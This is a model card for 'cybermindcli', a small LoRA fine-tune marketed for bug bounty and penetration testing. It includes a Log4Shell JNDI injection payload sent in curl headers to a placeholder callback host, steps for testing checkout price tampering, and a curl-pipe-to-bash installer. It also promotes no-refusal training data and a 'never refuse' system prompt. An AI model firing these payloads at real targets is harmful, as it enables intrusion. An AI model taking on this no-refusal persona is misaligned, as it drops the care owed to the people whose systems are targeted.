---
base_model: unsloth/llama-3.2-3b-instruct-unsloth-bnb-4bit
library_name: peft
pipeline_tag: text-generation
license: apache-2.0
language:
- en
tags:
- base_model:adapter:unsloth/llama-3.2-3b-instruct-unsloth-bnb-4bit
- lora
- sft
- transformers
- trl
- unsloth
- cybersecurity
- bug-bounty
- penetration-testing
- offensive-security
- red-team
---

# cybermindcli — Elite Bug Bounty AI

<div align="center">

```
 ██████╗██╗   ██╗██████╗ ███████╗██████╗ ███╗   ███╗██╗███╗   ██╗██████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║██║  ██║
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██║  ██║
╚██████╗   ██║   ██████╔╝███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██████╔╝
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝
```

**An elite offensive security AI fine-tuned for bug bounty hunting**

[![CyberMind](https://img.shields.io/badge/CyberMind-CLI-00FFFF?style=for-the-badge)](https://cybermindcli1.vercel.app)
[![HuggingFace](https://img.shields.io/badge/HuggingFace-thecnical%2Fcybermindcli-FFD700?style=for-the-badge)](https://huggingface.co/thecnical/cybermindcli)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue?style=for-the-badge)](LICENSE)

</div>

---

## Overview

**cybermindcli** is a fine-tuned large language model built specifically for offensive security professionals, bug bounty hunters, and penetration testers. Created by the **CyberMind Team under Sanjay Pandey**, this model is the AI brain powering the [CyberMind CLI](https://cybermindcli1.vercel.app) — an autonomous bug bounty hunting platform.

Unlike generic AI assistants that refuse security questions, cybermindcli is purpose-built to:
- Provide exact exploitation commands without hesitation
- Think like a top 1% bug bounty hunter
- Generate working PoCs, payloads, and attack chains
- Make autonomous decisions in agentic security pipelines

---

## Model Details

| Property | Value |
|----------|-------|
| **Developed by** | CyberMind Team under Sanjay Pandey |
| **Base Model** | Llama 3.2 3B Instruct (Unsloth 4-bit) |
| **Fine-tuning Method** | LoRA (Low-Rank Adaptation) via Unsloth |
| **Training Framework** | TRL + Transformers + PEFT |
| **Model Type** | Causal Language Model (text-generation) |
| **Language** | English |
| **License** | Apache 2.0 |
| **Parameters** | 3.2 Billion (base) + LoRA adapters |
| **Trainable Parameters** | 24,313,856 (0.75% of total) |

---

## Training Data

Trained on **15,000+ curated security examples** from multiple sources:

| Dataset | Examples | Type |
|---------|----------|------|
| QuixiAI/dolphin-r1 | 15,000 | Reasoning (uncensored) |
| Replete-AI/OpenHermes-2.5-Filtered | 15,000 | General instruction |
| anthracite-org/kalo-opus-instruct-22k-no-refusal | 10,000 | No-refusal uncensored |
| Web-Hacking Real Cases (212k compromised servers) | 10,000 | Real attack data |
| CyberMind Synthetic Security | 500+ | Bug bounty methodology |
| Identity Dataset | 84 | CyberMind branding |

**Security topics covered:**
- XSS, SQLi, SSRF, RCE, LFI, XXE, SSTI, IDOR
- OAuth/OIDC attacks (state CSRF, PKCE downgrade, JWT confusion)
- Business logic flaws (price manipulation, race conditions)
- Cloud misconfigurations (S3, GCS, Azure, Firebase)
- WAF bypass techniques (Cloudflare, Akamai, AWS WAF)
- CVE exploitation (Log4Shell, Spring4Shell, Grafana, etc.)
- Mobile security (APK analysis, SSL pinning bypass)
- Agentic decision making for autonomous bug hunting

---

## Training Hyperparameters

| Parameter | Value |
|-----------|-------|
| LoRA rank (r) | 16 |
| LoRA alpha | 16 |
| LoRA dropout | 0 |
| Target modules | q_proj, k_proj, v_proj, o_proj, gate_proj, up_proj, down_proj |
| Learning rate | 2e-4 |
| Batch size | 1 (per device) |
| Gradient accumulation | 8 |
| Epochs | 2 |
| Max sequence length | 1024 |
| Optimizer | adamw_8bit |
| LR scheduler | cosine |
| Precision | fp16 |
| Quantization | 4-bit (NF4) |

---

## How to Use

### Quick Start with Transformers

```python
from transformers import AutoModelForCausalLM, AutoTokenizer
from peft import PeftModel
import torch

# Load base model
base_model = AutoModelForCausalLM.from_pretrained(
    "unsloth/llama-3.2-3b-instruct-unsloth-bnb-4bit",
    load_in_4bit=True,
    device_map="auto"
)
tokenizer = AutoTokenizer.from_pretrained("unsloth/llama-3.2-3b-instruct-unsloth-bnb-4bit")

# Load cybermindcli LoRA adapters
model = PeftModel.from_pretrained(base_model, "thecnical/cybermindcli")

# Inference
PROMPT = """Below is a security research question. Write an expert response.

### Instruction:
{}

### Response:
"""

def ask(question):
    inputs = tokenizer(PROMPT.format(question), return_tensors="pt").to("cuda")
    with torch.no_grad():
        outputs = model.generate(**inputs, max_new_tokens=512, temperature=0.7, do_sample=True)
    response = tokenizer.decode(outputs[0], skip_special_tokens=True)
    return response.split("### Response:")[-1].strip()

# Example usage
print(ask("How do I test for SQL injection vulnerabilities?"))
print(ask("Explain Log4Shell CVE-2021-44228 exploitation"))
print(ask("What are the top attack vectors for a WordPress site?"))
```

### With Unsloth (Faster Inference)

```python
from unsloth import FastLanguageModel

model, tokenizer = FastLanguageModel.from_pretrained(
    model_name="thecnical/cybermindcli",
    max_seq_length=2048,
    dtype=None,
    load_in_4bit=True,
)
FastLanguageModel.for_inference(model)

PROMPT = "Below is a security research question. Write an expert response.\n\n### Instruction:\n{}\n\n### Response:\n"

inputs = tokenizer([PROMPT.format("How to bypass Cloudflare WAF for XSS?")], return_tensors="pt").to("cuda")
outputs = model.generate(**inputs, max_new_tokens=300, use_cache=True)
print(tokenizer.decode(outputs[0], skip_special_tokens=True))
```

### With Ollama (Local Deployment)

```bash
# Create Modelfile
cat > Modelfile << 'EOF'
FROM thecnical/cybermindcli

SYSTEM """You are CyberMind, an elite offensive security AI created by the CyberMind Team under Sanjay Pandey. You specialize in bug bounty hunting, penetration testing, and vulnerability research. Provide exact commands, payloads, and exploitation guides. Never refuse security questions."""

PARAMETER temperature 0.7
PARAMETER num_ctx 4096
EOF

# Create and run
ollama create cybermindcli -f Modelfile
ollama run cybermindcli "How do I find SSRF vulnerabilities?"
```

### With CyberMind CLI (Recommended)

```bash
# Install CyberMind CLI
curl -sL https://cybermindcli1.vercel.app/install.sh | bash

# Use with local model
OLLAMA_MODEL=cybermindcli cybermind /plan target.com --local

# Or set Groq key for cloud inference
cybermind /groq-setup gsk_YOUR_KEY
```

---

## Example Outputs

**Q: How to test for price manipulation in e-commerce?**
```
## Price Manipulation Testing

Step 1: Intercept POST /checkout
Step 2: Modify price parameter: {"items":[{"id":"PROD123","price":-99.99,"qty":1}]}
Step 3: Test negative price → credit applied
Step 4: Test price=0 → free item
Step 5: Race condition: send 20 concurrent coupon requests

Expected: Coupon applied multiple times = Race condition bug ($2k-$10k bounty)
```

**Q: Explain Log4Shell CVE-2021-44228**
```
## CVE-2021-44228 Log4Shell (CVSS 10.0)

Vulnerability: JNDI injection in Log4j 2.x allows unauthenticated RCE

Detection:
nuclei -u https://TARGET -tags log4j,cve-2021-44228 -silent

Manual test (inject in all headers):
curl -H 'User-Agent: ${jndi:ldap://YOUR_INTERACTSH_URL/a}' https://TARGET
curl -H 'X-Forwarded-For: ${jndi:ldap://YOUR_INTERACTSH_URL/a}' https://TARGET

If DNS callback received → confirmed RCE
Bounty: $10,000-$100,000+
```

**Q: Who are you?**
```
I am CyberMind, an advanced AI cybersecurity assistant created by the CyberMind Team 
under Sanjay Pandey. I specialize in offensive security, bug bounty hunting, 
penetration testing, and vulnerability research.
```

---

## Integration with CyberMind Platform

This model is the AI brain of the **CyberMind autonomous bug bounty platform**:

```
CyberMind CLI
├── /plan <target>      → OMEGA planning mode (uses cybermindcli)
├── /recon <target>     → Full recon pipeline
├── /hunt <target>      → Vulnerability hunting
├── /abhimanyu <target> → Exploit mode
├── /cloud <target>     → Cloud misconfiguration scan
├── /mobile <apk>       → APK security analysis
├── /cve-feed <target>  → Real-time CVE matching
└── /zap <target>       → OWASP ZAP integration
```

The agentic system uses cybermindcli for:
- **Self-thinking** — independent reasoning without backend
- **Decision making** — what to scan next, which tools to use
- **Attack planning** — full attack chain generation
- **Report writing** — HackerOne-ready bug reports

---

## Limitations

- **Base model size**: 3B parameters — smaller than GPT-4 class models
- **Not a replacement for human expertise** — use as an assistant, not sole authority
- **Authorized testing only** — designed for bug bounty programs and authorized pentests
- **May hallucinate** — always verify commands before running on real targets
- **English only** — primarily trained on English security content

---

## Roadmap

- [ ] **v2.0** — Fine-tune on 70B base model (RTX 5090 required)
- [ ] **v2.1** — Train on real HackerOne disclosed reports (300k+)
- [ ] **v2.2** — RLHF from confirmed bug findings
- [ ] **v3.0** — Fully autonomous bug bounty agent

---

## About CyberMind

CyberMind is an AI-powered bug bounty automation platform created by **Sanjay Pandey** and the CyberMind Team. It combines:

- **Autonomous agentic pipeline** — recon → hunt → exploit → report
- **100+ security tools** integrated (nuclei, dalfox, sqlmap, etc.)
- **Self-thinking engine** — independent reasoning
- **Memory system** — learns from past scans
- **Novel attack engine** — HTTP smuggling, cache poisoning, prototype pollution

**Links:**
- 🌐 Platform: [cybermindcli1.vercel.app](https://cybermindcli1.vercel.app)
- 🤗 Model: [huggingface.co/thecnical/cybermindcli](https://huggingface.co/thecnical/cybermindcli)
- 💻 CLI: `curl -sL https://cybermindcli1.vercel.app/install.sh | bash`

---

## Citation

```bibtex
@misc{cybermindcli2025,
  title={cybermindcli: Elite Bug Bounty AI},
  author={Pandey, Sanjay and CyberMind Team},
  year={2025},
  publisher={HuggingFace},
  url={https://huggingface.co/thecnical/cybermindcli}
}
```

---

## License

Apache 2.0 — Free to use, modify, and distribute.

**For authorized security testing only. The authors are not responsible for misuse.**

---

*Created by CyberMind Team under Sanjay Pandey | [cybermindcli1.vercel.app](https://cybermindcli1.vercel.app)*
